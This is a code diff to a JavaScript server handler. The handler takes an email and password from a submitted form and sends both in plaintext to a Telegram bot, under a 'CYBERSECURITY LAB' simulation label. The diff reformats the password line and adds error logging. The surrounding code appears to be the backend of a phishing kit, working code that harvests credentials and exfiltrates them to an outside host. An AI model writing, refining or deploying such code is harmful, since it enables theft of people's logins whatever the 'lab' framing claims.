@@ -44,7 +44,7 @@ export default async function handler(req, res) {
                         "🔐 CYBERSECURITY LAB\n\n" +
                         "📧 Test Email: " + email + "\n" +
                         "🛡️ Simulation: Form submitted\n" +
-                        "🔒  password: "+ password +"\n" +
+                        "🔒 Password: " + password +"\n" +
                         "🕒 " + new Date().toISOString()
                 })
             }
@@ -53,6 +53,8 @@ export default async function handler(req, res) {
         const data = await response.json();
 
         if (!response.ok || !data.ok) {
+            console.error("Telegram API error:", data.description);
+
             return res.status(502).json({
                 message: "Telegram notification failed"
             });
@@ -64,9 +66,10 @@ export default async function handler(req, res) {
 
     } catch (error) {
 
+        console.error("Connection error:", error.message);
+
         return res.status(502).json({
             message: "Telegram connection failed"
         });
-
     }
 }
